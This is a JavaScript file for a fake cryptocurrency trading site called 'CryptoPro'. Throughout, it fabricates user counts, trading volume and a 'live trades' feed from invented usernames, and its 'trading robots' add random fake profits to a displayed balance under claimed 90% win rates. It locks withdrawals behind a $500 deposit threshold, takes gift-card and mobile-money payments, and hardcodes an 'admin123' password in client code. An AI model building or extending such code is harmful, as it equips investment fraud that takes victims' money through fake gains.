// ==================== ENHANCED CONFIGURATION ====================
const CONFIG = {
    ADMIN_PASSWORD: 'admin123',
    ADMIN_SECRET_KEY: 'CryptoPro2024Admin',
    
    AUTO_APPROVE_ALL: true,
    MINIMUM_DEPOSIT: 10,
    MINIMUM_BALANCE_FOR_TRADING: 50,
    TRADING_FEE: 0.001,
    MINIMUM_TOTAL_DEPOSITS_FOR_WITHDRAWAL: 500,
    WITHDRAWAL_UNLOCK_MESSAGE: "Complete account verification and deposit requirements",
    
    // TRADING ROBOTS - Enhanced simulation
    ENABLE_TRADING_ROBOTS: true,
    ROBOT_TRADE_INTERVAL: 8000,  // Trade every 8 seconds for more activity
    ROBOT_MIN_PROFIT: 5,
    ROBOT_MAX_PROFIT: 50,
    ROBOT_SUCCESS_RATE: 0.85,
    
    // LIVE PLATFORM STATS - Dynamic simulation
    SIMULATE_ACTIVE_USERS: true,
    BASE_ACTIVE_USERS: 1247,
    USER_VARIANCE: 50,  // +/- 50 users
    
    SIMULATE_VOLUME: true,
    BASE_24H_VOLUME: 97500000,  // $97.5M
    VOLUME_VARIANCE: 5000000,   // +/- $5M
    
    // LIVE TRADES FEED - Show other "users" trading
    SHOW_LIVE_TRADES: true,
    LIVE_TRADE_INTERVAL: 3000,  // New trade every 3 seconds
    MAX_LIVE_TRADES_DISPLAY: 10,
    
    // Payment Methods
    PAYMENT_METHODS: {
        crypto: {
            BTC: { name: 'Bitcoin', symbol: 'BTC', rate: 64250, icon: '₿', address: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh' },
            ETH: { name: 'Ethereum', symbol: 'ETH', rate: 3420, icon: 'Ξ', address: '0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb' },
            USDT: { name: 'Tether', symbol: 'USDT', rate: 1, icon: '₮', address: 'TXj1kD7ePQ9wN8mR5tH6vL2sK3pB4cF8gA' },
            BNB: { name: 'BNB', symbol: 'BNB', rate: 580, icon: 'BNB', address: '0x28C6c06298d514Db089934071355E5743bf21d60' },
            SOL: { name: 'Solana', symbol: 'SOL', rate: 145, icon: 'SOL', address: '7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU' }
        },
        digital: {
            PAYPAL: { name: 'PayPal', rate: 1, email: 'payments@cryptopro.com', icon: '💳' },
            CASHAPP: { name: 'Cash App', rate: 1, cashtag: '$CryptoPro', icon: '💵' },
            VENMO: { name: 'Venmo', rate: 1, username: '@cryptopro', icon: '💰' }
        },
        mobile: {
            MPESA: { name: 'M-Pesa', rate: 0.0076, currency: 'KES', number: '+254712345678', icon: '📱' },
            MTN: { name: 'MTN Mobile Money', rate: 0.00084, currency: 'UGX', number: '+256700000000', icon: '📱' }
        },
        giftcards: {
            AMAZON: { name: 'Amazon Gift Card', rate: 0.85, icon: '🎁' },
            ITUNES: { name: 'iTunes/Apple', rate: 0.80, icon: '🍎' },
            GOOGLE: { name: 'Google Play', rate: 0.82, icon: '🎮' }
        }
    }
};

// ==================== ENHANCED APP STATE ====================
let appState = {
    accountType: 'demo',
    isAdmin: false,
    demoBalance: 10000,
    realBalance: 0,
    displayBalance: 0,
    adminWallet: 0,
    pendingDeposits: [],
    approvedDeposits: [],
    pendingWithdrawals: [],
    userTotalDeposited: 0,
    transactions: [],
    activeTrades: [],
    robotTrades: [],
    totalRobotProfits: 0,
    lastRobotTradeTime: 0,
    selectedBot: 'none',
    availableBots: {
        none: { name: 'Manual Trading', icon: '👤', profitRate: 0, description: 'Trade manually yourself' },
        conservative: { name: 'Conservative Bot', icon: '🛡️', profitRate: 0.65, minProfit: 3, maxProfit: 15, description: '65% win rate, steady gains' },
        balanced: { name: 'Balanced Bot', icon: '⚖️', profitRate: 0.75, minProfit: 10, maxProfit: 35, description: '75% win rate, balanced approach' },
        aggressive: { name: 'Aggressive Bot', icon: '🚀', profitRate: 0.85, minProfit: 20, maxProfit: 80, description: '85% win rate, maximum profits' },
        expert: { name: 'Expert AI Bot', icon: '🤖', profitRate: 0.90, minProfit: 30, maxProfit: 120, description: '90% win rate, AI-powered' }
    },
    totalDeposited: 0,
    totalWithdrawn: 0,
    paymentHistory: [],
    tradingProfits: 0,
    isAccountVerified: false,
    
    // NEW: Live platform stats
    currentActiveUsers: 1247,
    current24hVolume: 97500000,
    liveTrades: [],  // Recent trades from "other users"
    platformTotalTrades: 45678,  // Total trades on platform
    platformTotalUsers: 8234,    // Total registered users
};

// ==================== LIVE PLATFORM SIMULATION ====================

// Simulate active users count
function updateActiveUsers() {
    if (!CONFIG.SIMULATE_ACTIVE_USERS) return;
    
    // Fluctuate users naturally
    const change = Math.floor((Math.random() - 0.5) * 20);
    appState.currentActiveUsers = Math.max(
        CONFIG.BASE_ACTIVE_USERS - CONFIG.USER_VARIANCE,
        Math.min(
            CONFIG.BASE_ACTIVE_USERS + CONFIG.USER_VARIANCE,
            appState.currentActiveUsers + change
        )
    );
    
    // Update UI
    const userEl = document.getElementById('activeUsers');
    if (userEl) {
        userEl.textContent = appState.currentActiveUsers.toLocaleString();
    }
}

// Simulate 24h volume
function update24hVolume() {
    if (!CONFIG.SIMULATE_VOLUME) return;
    
    // Fluctuate volume
    const change = (Math.random() - 0.5) * 1000000;  // +/- $1M
    appState.current24hVolume = Math.max(
        CONFIG.BASE_24H_VOLUME - CONFIG.VOLUME_VARIANCE,
        Math.min(
            CONFIG.BASE_24H_VOLUME + CONFIG.VOLUME_VARIANCE,
            appState.current24hVolume + change
        )
    );
    
    // Update UI
    const volumeEl = document.getElementById('volume24h');
    if (volumeEl) {
        const formatted = '$' + (appState.current24hVolume / 1000000).toFixed(1) + 'M';
        volumeEl.textContent = formatted;
    }
}

// Generate realistic usernames
function generateUsername() {
    const prefixes = ['Crypto', 'Trade', 'Bull', 'Bear', 'Whale', 'Moon', 'Degen', 'Diamond', 'Gold', 'Silver'];
    const suffixes = ['King', 'Queen', 'Master', 'Pro', 'Ace', 'Legend', 'Ninja', 'Shark', 'Wolf', 'Lion'];
    const numbers = Math.floor(Math.random() * 9999);
    
    const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
    const suffix = suffixes[Math.floor(Math.random() * suffixes.length)];
    
    return `${prefix}${suffix}${numbers}`;
}

// Simulate live trades from other users
function simulateLiveTrade() {
    if (!CONFIG.SHOW_LIVE_TRADES) return;
    
    const pairs = Object.keys(cryptoPrices);
    const pair = pairs[Math.floor(Math.random() * pairs.length)];
    const types = ['BUY', 'SELL'];
    const type = types[Math.floor(Math.random() * types.length)];
    
    // Random trade amount between $50-$5000
    const amount = 50 + Math.random() * 4950;
    
    // Random profit/loss
    const isProfit = Math.random() > 0.35;  // 65% profitable
    const profitPercent = isProfit 
        ? (1 + Math.random() * 8)   // +1% to +9%
        : -(1 + Math.random() * 4);  // -1% to -5%
    
    const liveTrade = {
        id: 'live_' + Date.now() + '_' + Math.random(),
        username: generateUsername(),
        pair: pair,
        type: type,
        amount: amount,
        profitPercent: profitPercent,
        profit: amount * (profitPercent / 100),
        timestamp: new Date().toISOString(),
        isProfit: isProfit
    };
    
    // Add to live trades feed
    appState.liveTrades.unshift(liveTrade);
    
    // Keep only last N trades
    if (appState.liveTrades.length > CONFIG.MAX_LIVE_TRADES_DISPLAY) {
        appState.liveTrades = appState.liveTrades.slice(0, CONFIG.MAX_LIVE_TRADES_DISPLAY);
    }
    
    // Increment platform stats
    appState.platformTotalTrades++;
    
    // Update live trades display
    updateLiveTradesDisplay();
}

// Update live trades feed in UI
function updateLiveTradesDisplay() {
    const container = document.getElementById('liveTradesContainer');
    if (!container) return;
    
    const html = appState.liveTrades.map(trade => {
        const timeAgo = getTimeAgo(new Date(trade.timestamp));
        const profitColor = trade.isProfit ? '#00ff88' : '#ff006e';
        const profitSign = trade.isProfit ? '+' : '';
        
        return `
            <div class="live-trade-item" style="
                display: flex;
                justify-content: space-between;
                align-items: center;
                padding: 12px;
                background: rgba(10, 25, 45, 0.4);
                border-left: 3px solid ${profitColor};
                border-radius: 8px;
                margin-bottom: 8px;
                animation: slideInLeft 0.3s ease-out;
            ">
                <div style="flex: 1;">
                    <div style="font-size: 13px; font-weight: 600; margin-bottom: 2px;">
                        ${trade.username}
                    </div>
                    <div style="font-size: 11px; opacity: 0.6;">
                        ${trade.type} ${trade.pair} • $${trade.amount.toFixed(0)}
                    </div>
                </div>
                <div style="text-align: right;">
                    <div style="font-size: 14px; font-weight: 700; color: ${profitColor};">
                        ${profitSign}${trade.profitPercent.toFixed(2)}%
                    </div>
                    <div style="font-size: 10px; opacity: 0.5;">
                        ${timeAgo}
                    </div>
                </div>
            </div>
        `;
    }).join('');
    
    container.innerHTML = html || '<div style="opacity: 0.5; text-align: center; padding: 20px;">No recent trades</div>';
}

// Helper: Get time ago string
function getTimeAgo(date) {
    const seconds = Math.floor((new Date() - date) / 1000);
    
    if (seconds < 10) return 'just now';
    if (seconds < 60) return seconds + 's ago';
    
    const minutes = Math.floor(seconds / 60);
    if (minutes < 60) return minutes + 'm ago';
    
    const hours = Math.floor(minutes / 60);
    return hours + 'h ago';
}

// ==================== ENHANCED ROBOT TRADING WITH VISUAL FEEDBACK ====================

function simulateRobotTrade() {
    if (appState.selectedBot === 'none' || appState.accountType !== 'real' || appState.displayBalance < 50) {
        return;
    }
    
    const now = Date.now();
    if (now - appState.lastRobotTradeTime < CONFIG.ROBOT_TRADE_INTERVAL) {
        return;
    }
    
    appState.lastRobotTradeTime = now;
    
    const botConfig = appState.availableBots[appState.selectedBot];
    const pairs = Object.keys(cryptoPrices);
    const pair = pairs[Math.floor(Math.random() * pairs.length)];
    
    const isProfit = Math.random() < botConfig.profitRate;
    
    let profitAmount;
    if (isProfit) {
        profitAmount = botConfig.minProfit + Math.random() * (botConfig.maxProfit - botConfig.minProfit);
    } else {
        profitAmount = -(botConfig.minProfit * 0.3 + Math.random() * (botConfig.minProfit * 0.5));
    }
    
    const robotTrade = {
        id: 'robot_' + Date.now(),
        pair: pair,
        type: isProfit ? 'BUY' : 'SELL',
        profit: profitAmount,
        timestamp: new Date().toISOString(),
        botName: botConfig.name,
        botIcon: botConfig.icon,
        entryPrice: cryptoPrices[pair],
        exitPrice: cryptoPrices[pair] * (1 + (profitAmount / 100))
    };
    
    appState.displayBalance += profitAmount;
    appState.totalRobotProfits += profitAmount;
    
    appState.robotTrades.unshift(robotTrade);
    if (appState.robotTrades.length > 20) {
        appState.robotTrades = appState.robotTrades.slice(0, 20);
    }
    
    appState.transactions.push({
        id: robotTrade.id,
        type: 'ROBOT_TRADE',
        amount: profitAmount,
        description: `${robotTrade.botIcon} ${robotTrade.botName} - ${pair}`,
        timestamp: robotTrade.timestamp
    });
    
    saveState();
    updateUI();
    
    if (profitAmount !== 0) {
        showRobotTradeNotification(robotTrade);
        showTradeAnimation(robotTrade);
    }
}

// Enhanced notification with more details
function showRobotTradeNotification(trade) {
    const notification = document.createElement('div');
    const isProfit = trade.profit > 0;
    
    notification.style.cssText = `
        position: fixed;
        top: 80px;
        right: 20px;
        background: ${isProfit ? 'linear-gradient(135deg, #00ff88 0%, #00cc6a 100%)' : 'linear-gradient(135deg, #ff006e 0%, #cc0055 100%)'};
        color: ${isProfit ? '#000' : '#fff'};
        padding: 16px 20px;
        border-radius: 12px;
        box-shadow: 0 4px 20px rgba(0, 255, 136, 0.4);
        z-index: 9999;
        font-weight: bold;
        animation: slideInRight 0.3s ease-out;
        max-width: 320px;
        min-width: 280px;
    `;
    
    notification.innerHTML = `
        <div style="display: flex; align-items: center; gap: 12px;">
            <div style="font-size: 28px;">${trade.botIcon}</div>
            <div style="flex: 1;">
                <div style="font-size: 12px; opacity: 0.9; margin-bottom: 4px;">${trade.botName}</div>
                <div style="font-size: 16px; font-weight: 800; margin-bottom: 4px;">
                    ${trade.pair} ${trade.type}
                </div>
                <div style="font-size: 14px; opacity: 0.85;">
                    ${isProfit ? '+' : ''}$${trade.profit.toFixed(2)}
                </div>
            </div>
            <div style="font-size: 24px;">
                ${isProfit ? '✅' : '📉'}
            </div>
        </div>
    `;
    
    document.body.appendChild(notification);
    
    setTimeout(() => {
        notification.style.animation = 'slideOutRight 0.3s ease-out';
        setTimeout(() => notification.remove(), 300);
    }, 4000);
}

// Show trade animation overlay
function showTradeAnimation(trade) {
    const isProfit = trade.profit > 0;
    
    // Create brief flash animation
    const flash = document.createElement('div');
    flash.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: ${isProfit ? 'rgba(0, 255, 136, 0.1)' : 'rgba(255, 0, 110, 0.1)'};
        z-index: 9998;
        pointer-events: none;
        animation: flashFade 0.5s ease-out;
    `;
    
    document.body.appendChild(flash);
    setTimeout(() => flash.remove(), 500);
}

// ==================== ENHANCED START LIVE UPDATES ====================
function startLiveUpdates() {
    // Price updates
    setInterval(updatePrices, 2000);
    
    // Active trades
    setInterval(updateActiveTrades, 1000);
    
    // Robot trading
    if (CONFIG.ENABLE_TRADING_ROBOTS) {
        setInterval(simulateRobotTrade, CONFIG.ROBOT_TRADE_INTERVAL);
    }
    
    // Platform stats
    if (CONFIG.SIMULATE_ACTIVE_USERS) {
        setInterval(updateActiveUsers, 5000);  // Update every 5 seconds
    }
    
    if (CONFIG.SIMULATE_VOLUME) {
        setInterval(update24hVolume, 10000);  // Update every 10 seconds
    }
    
    // Live trades feed
    if (CONFIG.SHOW_LIVE_TRADES) {
        setInterval(simulateLiveTrade, CONFIG.LIVE_TRADE_INTERVAL);
    }
    
    // Update live trades display
    setInterval(updateLiveTradesDisplay, 2000);
}

// ==================== ENHANCED CSS ANIMATIONS ====================
const enhancedStyle = document.createElement('style');
enhancedStyle.textContent = `
    @keyframes slideInLeft {
        from {
            transform: translateX(-400px);
            opacity: 0;
        }
        to {
            transform: translateX(0);
            opacity: 1;
        }
    }
    
    @keyframes slideInRight {
        from {
            transform: translateX(400px);
            opacity: 0;
        }
        to {
            transform: translateX(0);
            opacity: 1;
        }
    }
    
    @keyframes slideOutRight {
        from {
            transform: translateX(0);
            opacity: 1;
        }
        to {
            transform: translateX(400px);
            opacity: 0;
        }
    }
    
    @keyframes flashFade {
        0% { opacity: 1; }
        100% { opacity: 0; }
    }
    
    @keyframes pulseGlow {
        0%, 100% {
            box-shadow: 0 0 10px rgba(0, 217, 255, 0.5);
        }
        50% {
            box-shadow: 0 0 20px rgba(0, 217, 255, 0.8);
        }
    }
    
    .live-indicator {
        animation: pulseGlow 2s ease-in-out infinite;
    }
`;
document.head.appendChild(enhancedStyle);

// Initialize on load
document.addEventListener('DOMContentLoaded', function() {
    console.log('💎 CryptoPro Active - Enhanced Trading Platform');
    loadState();
    updateUI();
    startLiveUpdates();
    attachEventListeners();
    checkAdminStatus();
    
    // Start initial simulations
    updateActiveUsers();
    update24hVolume();
    simulateLiveTrade();
});
